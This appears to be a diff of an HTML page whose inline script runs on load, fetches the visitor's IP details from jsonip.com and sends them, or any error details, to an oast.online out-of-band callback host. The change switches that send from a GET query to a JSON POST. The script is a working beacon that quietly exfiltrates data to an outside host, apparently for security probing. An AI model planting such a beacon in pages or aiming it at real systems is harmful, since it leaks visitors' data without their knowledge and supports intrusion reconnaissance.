@@ -5,7 +5,7 @@
   <div id="result1"></div>
   
   <script>
-  async function getData() {
+async function getData() {
     const url = "https://jsonip.com";
     const oast = "https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/";
 
@@ -21,20 +21,38 @@
         document.getElementById("result").textContent =
             JSON.stringify(result, null, 2);
 
-        await fetch(`${oast}?q=${encodeURIComponent(JSON.stringify(result))}`);
+        await fetch(oast, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                type: "success",
+                status: response.status,
+                response: result
+            })
+        });
 
     } catch (error) {
         const errorInfo = {
-            name: error?.name,
-            message: error?.message
+            type: "error",
+            name: error?.name || "UnknownError",
+            message: error?.message || String(error)
         };
 
         document.getElementById("result").textContent =
             JSON.stringify(errorInfo, null, 2);
 
-        await fetch(`${oast}?q=${encodeURIComponent(JSON.stringify(errorInfo))}`);
+        await fetch(oast, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(errorInfo)
+        });
     }
 }
+
 
 getData();
   </script>
